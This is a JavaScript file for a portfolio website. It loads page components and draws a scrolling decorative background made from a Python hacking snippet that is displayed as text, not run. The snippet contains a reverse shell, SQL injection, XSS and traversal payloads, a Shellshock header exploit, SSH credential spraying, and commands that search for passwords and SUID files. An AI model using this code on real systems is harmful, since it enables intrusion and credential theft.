async function loadComponent(id, file) {
  const res = await fetch(`components/${file}`);
  const html = await res.text();
  document.getElementById(id).innerHTML = html;
}

Promise.all([
  loadComponent('nav-placeholder',        'nav.html'),
  loadComponent('hero-placeholder',       'hero.html'),
  loadComponent('story-placeholder',      'story.html'),
  loadComponent('projects-placeholder',   'projects.html'),
  loadComponent('experience-placeholder', 'experience.html'),
  loadComponent('skills-placeholder',     'skills.html'),
  loadComponent('education-placeholder',  'education.html'),
  loadComponent('contact-placeholder',    'contact.html'),
]).then(() => {
  initCodeBg();
});

function initCodeBg() {
  const section = document.getElementById('projects');
  if (!section) return;

  const snippet = [
    '#!/usr/bin/env python3',
    'import socket, nmap, hashlib, paramiko',
    'from scapy.all import IP, TCP, sr1',
    '',
    'def port_scan(target, ports="1-1024"):',
    '    nm = nmap.PortScanner()',
    '    nm.scan(target, ports, "-sV --script vuln")',
    '    for proto in nm[target].all_protocols():',
    '        for port in nm[target][proto]:',
    '            s = nm[target][proto][port]',
    '            if s["state"] == "open":',
    '                yield port, s["name"], s["version"]',
    '',
    'def syn_scan(target, port):',
    '    pkt = IP(dst=target)/TCP(dport=port, flags="S")',
    '    resp = sr1(pkt, timeout=1, verbose=0)',
    '    if resp and resp.haslayer(TCP):',
    '        return "OPEN" if resp[TCP].flags == 0x12 else "CLOSED"',
    '    return "FILTERED"',
    '',
    'def banner_grab(host, port):',
    '    try:',
    '        s = socket.socket()',
    '        s.settimeout(2)',
    '        s.connect((host, port))',
    '        return s.recv(1024).decode().strip()',
    '    except Exception:',
    '        return None',
    '',
    'def check_sqli(url, param):',
    "    payloads = [\"'\", \"' OR '1'='1\",",
    '               "1; SELECT sleep(5)--",',
    '               "1 UNION SELECT null,table_name",',
    '               "FROM information_schema.tables--"]',
    '    for p in payloads:',
    '        r = requests.get(url, params={param: p})',
    '        if any(x in r.text.lower()',
    '               for x in ["error","sql","syntax"]):',
    '            return True, p',
    '    return False, None',
    '',
    'def crack_hash(hash_val, wordlist, algo="md5"):',
    '    h = hashlib.new(algo)',
    '    with open(wordlist) as f:',
    '        for word in f:',
    '            w = word.strip()',
    '            h2 = hashlib.new(algo, w.encode())',
    '            if h2.hexdigest() == hash_val:',
    '                return w',
    '    return None',
    '',
    'def reverse_shell(lhost, lport):',
    '    import pty, os',
    '    s = socket.socket(socket.AF_INET,',
    '                      socket.SOCK_STREAM)',
    '    s.connect((lhost, lport))',
    '    os.dup2(s.fileno(), 0)',
    '    os.dup2(s.fileno(), 1)',
    '    os.dup2(s.fileno(), 2)',
    "    pty.spawn('/bin/bash')",
    '',
    'def lateral_move(targets, creds):',
    '    for host in targets:',
    '        for user, pwd in creds:',
    '            try:',
    '                c = paramiko.SSHClient()',
    '                c.set_missing_host_key_policy(',
    '                    paramiko.AutoAddPolicy())',
    '                c.connect(host, username=user,',
    '                          password=pwd, timeout=3)',
    '                _, out, _ = c.exec_command(',
    '                    "id; uname -a; cat /etc/passwd")',
    '                print(f"[+] {user}@{host}")',
    '                print(out.read().decode())',
    '            except Exception:',
    '                pass',
    '',
    'def exploit_shellshock(target, cmd):',
    '    payload = ("() { :; }; /bin/bash -c"',
    '               + repr(cmd))',
    "    r = requests.get(f'http://{target}/cgi-bin/status',",
    "                     headers={'User-Agent': payload})",
    '    return r.text',
    '',
    'def lfi_traversal(url, depth=6):',
    '    traversal = "../" * depth',
    "    targets = ['etc/passwd','etc/shadow',",
    "               'proc/self/environ','var/log/auth.log']",
    '    for t in targets:',
    '        r = requests.get(url + traversal + t)',
    '        if "root:" in r.text:',
    '            return r.text',
    '    return None',
    '',
    'def xss_probe(url, param):',
    "    payloads = ['<script>alert(1)</script>',",
    '               \'"><img src=x onerror=alert(1)>\',',
    "               \"javascript:alert(document.cookie)\"]",
    '    for p in payloads:',
    '        r = requests.get(url, params={param: p})',
    '        if p in r.text:',
    '            return True, p',
    '    return False, None',
    '',
    'def privesc_check():',
    '    checks = [',
    '        "find / -perm -4000 2>/dev/null",',
    '        "sudo -l",',
    '        "cat /etc/crontab",',
    '        "ls -la /etc/passwd /etc/shadow",',
    '        "env | grep -i pass",',
    '        "ss -tlnp",',
    '    ]',
    '    for cmd in checks:',
    '        out = subprocess.check_output(',
    '            cmd, shell=True,',
    '            stderr=subprocess.DEVNULL)',
    '        yield cmd, out.decode()',
    '',
  ].join('\n');

  const bg = document.createElement('div');
  bg.id = 'projects-code-bg';
  section.insertBefore(bg, section.firstChild);

  const speeds = [38, 48, 32, 52, 42, 36];
  const delays = [0, -14, -26, -8, -20, -33];

  for (let i = 0; i < speeds.length; i++) {
    const col = document.createElement('div');
    col.className = 'code-col';
    col.style.setProperty('--dur', speeds[i] + 's');
    col.style.setProperty('--delay', delays[i] + 's');
    col.textContent = snippet + '\n' + snippet;
    bg.appendChild(col);
  }
}
